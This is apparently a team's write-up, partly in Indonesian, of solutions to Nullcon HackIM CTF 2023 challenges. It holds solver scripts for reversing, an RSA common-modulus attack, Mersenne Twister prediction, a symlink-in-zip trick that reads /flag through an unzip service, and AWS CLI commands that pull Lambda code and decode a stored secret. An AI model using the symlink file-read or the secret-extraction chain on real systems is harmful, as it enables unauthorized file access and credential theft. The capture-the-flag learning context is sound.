# Rev
## pythopia
```python
data = """
36
76
96
102
99
118
97
76
119
102
99
118
97
76
124
120
"""

# ENO{L13333333333
# 7_super_duper_ok
# _lolnullconctf!_
# _you_solved_it!}

"""
# ENO{L133333333337_super_duper_ok_you_solved_it!}

"""
out = ""
dec = map(int, data.strip().split())
for i in dec:
	out += (chr(i ^ 19))
	print(out)
```

## wheel
```python
"""
void __fastcall sub_555555555400(int arrayIndex, char numOperations)
{
  float updatedElement; // xmm0_4
  int indexCounter; // eax

  if ( numOperations > 0 )
  {
    updatedElement = flt_5555555580A0[arrayIndex];
    for ( indexCounter = 0; indexCounter != numOperations; ++indexCounter )
    {
      for ( updatedElement = (float)(updatedElement * 5.0) + 47.0;
            updatedElement >= 128.0;
            updatedElement = updatedElement - 128.0 )
      {
        ;
      }
    }
    flt_5555555580A0[arrayIndex] = updatedElement;
  }
}
"""
import string


data = [28.0, 74.0, 31.0, 99.0, 41.0, 52.0, 80.0, 125.0, 23.0, 11.0, 79.0, 91.0, 108.0, 42.0, 79.0, 118.0, 75.0, 79.0, 109.0, 42.0, 44.0, 11.0, 79.0, 44.0, 80.0, 127.0, 49.0, 0.0]
brute = string.letters + "{_}" + string.digits


flag = ""
for i in range(len(data)):
  for ch in brute:
    updatedElement = data[i]
    for indexCounter in range(ord(ch)):
        updatedElement = (updatedElement * 5.0) + 47.0
        while updatedElement >= 128.0:
            updatedElement -= 128.0
    if(updatedElement == 0.0):
      flag += ch
      break
    elif ch == brute[-1]:
      flag += "."
  print(flag)
```

# Crypto
## twin
```python
from Crypto.PublicKey import RSA
from Crypto.Util.number import *
import binascii
import gmpy2

def egcd(b, n):
    (x0, x1, y0, y1) = (1, 0, 0, 1)
    while n != 0:
        (q, b, n) = (b // n, n, b % n)
        (x0, x1) = (x1, x0 - q * x1)
        (y0, y1) = (y1, y0 - q * y1)
    return (b, x0, y0)

def neg_pow(a, b, n):
    assert b < 0
    assert GCD(a, n) == 1
    res = int(gmpy2.invert(a, n))
    res = pow(res, b*(-1), n)
    return res

def common_modulus(e1, e2, n, c1, c2):
	g, a, b = egcd(e1, e2)
	if a < 0:
		c1 = neg_pow(c1, a, n)
	else:
		c1 = pow(c1, a, n)
	if b < 0:
		c2 = neg_pow(c2, b, n)
	else:
		c2 = pow(c2, b, n)
	ct = c1*c2 % n
	m = int(gmpy2.iroot(ct, g)[0])
	return m

c1 = 198851474377165718028112972842265639215206348877016608622627311171042209963702835769614338398847455363946863082762173236373502223802847244557769309152020719377009343678096323767255545133734392981272835212545353488715110156427711111525743585480758640009319505322315888005188276904901023280620051538053743929669167795850860335549768969166461593906239357372330505433946129717041834475732372670961026001478227254999273718196250867204510681064391880099449164629711720021122445665846890550815079811041241824128791656795460007230003283109669795738520458565694688073372232365469969279979269172335621053156518588065204669164636568515585968088715299221616098448196835007486026306834585857385394379932580809203103023106229424720660096661585932612179471986633721231396764156601845262479014417201866703796806022479395694033815788446795158605478744234679438921219482709321859861288988156224563399413134218092016216147313958327131507901433719054874275160651556856183380492151746510052730242685874618761355215984376265719715473363476986957901445315504092719499838417381325617015369293491930133307630128865051357500960150518954750856507501366553062420719464692404538472137892443679198526541754483324903275970820090884602410278644781399298682978387326
c2 = 541940109836125333895781430104885967485013462238357425709353944075428304212181613346342168833632915771850317706081582413750750719712828061669251836467513116815496399077435572514863813419820177695716122433176805528532535188403726732767914692088563121640407878586264559446821905465347721083017105647280563402969518765808190495949892463753148040234604183497869168213134441134251591933907135463336654029223065998877557269475470179804195639035481928376550039377473960558788269310431313825888988908660191302311385846641723702093086996138971258640836061285893970041520552244977929645483977290602241276584136088984907441193129409236710662584843118801800457934169438121910252362434716190064236551302755562358860534549136237814085075287652312464795604230258140807652348468032431267225399615168922885291236301151723996369977845223020976025668767146139688511344868583917521559162297134719274102553947904603784500638033579530233721139319885875767560434666844423652986065991855466499543496592686627509183766091917402747468665062914322631033890742828511915046161646985793301031872822709060588586773552581644418553383314263000798086024158809854568189418235663070035600457464233007552461215491869285368208456103672933515573777187729174614608959934215

key1 = RSA.import_key(open('key1.pem','rb').read())
key2 = RSA.import_key(open('key2.pem','rb').read())

n = key2.n
e1 = key1.e
e2 = key2.e

m = common_modulus(e1, e2, n, c1, c2)

hex_ = hex(m).replace("0x","").replace("L","")
text = binascii.a2b_hex(hex_)
print(text.decode("utf-8"))
```

# Web
## zpr 
### Description
My colleague built a service which shows the contents of a zip file. He says there's nothing to worry about....

### Exploit
Saat kita melihat ke source code yang telah diberikan, kita akan melihat bahwa aplikasi menggunakan `unzip`, dimana unzip ini bisa menjadi titik akses kita untuk mendapatkan arbitary file read dan me read file flag yang ada di `/flag`.

```python 
...snip...
    if total_size > 250:
        raise Exception("Files too big in total")

check_output(['unzip', '-q', fpath, '-d', dpath])


g = glob.glob(dpath + "/*")
...snip...
```

Untuk mengeksplitasinya kita bisa membuat file zip yang didalamnya terdapat symlink yang berisi link ke file `/flag`.

```sh
ln -s /flag foo
zip -r --symlinks foo.zip foo
```

Setelah itu kita kirim zip yang kita buat tadi.

```python 
import requests

URL1 = "http://52.59.124.14:10015"
URL2 = "http://52.59.124.14:10016"


def sendfile(url=URL1):
    res = requests.post(url, files={"file": open("./foo.zip", "rb")})
    return res.text


def getfile(path, url=URL2):
    res = requests.get(url+path)
    return res.text


# print(sendfile()) # copas hasil dari ini ke getfile
print(getfile("/e647a3034a1c2db07d4c4d5cd461eba5/foo"))
```

Jalankan dan kita akan mendapatkan flagnya

![](https://i.imgur.com/mf3mgjw.png)

# Misc
## Babyrand
```python
from pwn import *
from mt19937predictor import MT19937Predictor

predictor = MT19937Predictor()
conn = remote('52.59.124.14', 10011)
for i in range(70):
    print(conn.recvline())
    for j in range(9):
        num = int(conn.recvline().strip())
        predictor.setrandbits(num, 32)

    conn.recvline()
    conn.sendline(str(predictor.getrandbits(32)).encode())
```

# Our Team Writeup
Daffainfo: https://github.com/daffainfo/ctf-writeup/tree/main/Nullcon%20HackIM%20CTF%202023
- Web	reguest
- Crypto	twin

# etc
[https://gist.github.com/X3eRo0/df332ca375b114faed40f16e6393ac36](https://gist.github.com/X3eRo0/df332ca375b114faed40f16e6393ac36 "https://gist.github.com/X3eRo0/df332ca375b114faed40f16e6393ac36") Untuk soal pwn

Buat yang misc selain `babyrand`, dikasihnya link ini [https://github.com/ambionics/mt_rand-reverse](https://github.com/ambionics/mt_rand-reverse "https://github.com/ambionics/mt_rand-reverse")

untuk soal rain checks - cloud
```sh
aws sts get-session-token --serial-number "arn:aws:iam::743296330440:mfa/mfa-exposed-user" --token-code 329122 > token.json
# Set token env vars
aws lambda get-function --function-name lambda-confirm-secret --out json | jq
# Read description for more function names, find "lambda-aws-config-confirm-state-of-secrets"
aws lambda get-function --function-name lambda-aws-config-confirm-state-of-secrets --out json --query "Code.Location" --output text | xargs wget -O - -q | zcat | grep 'SecretString=' | sed "s/.*'\(.*\)'.*/\1/" | base64 -d
```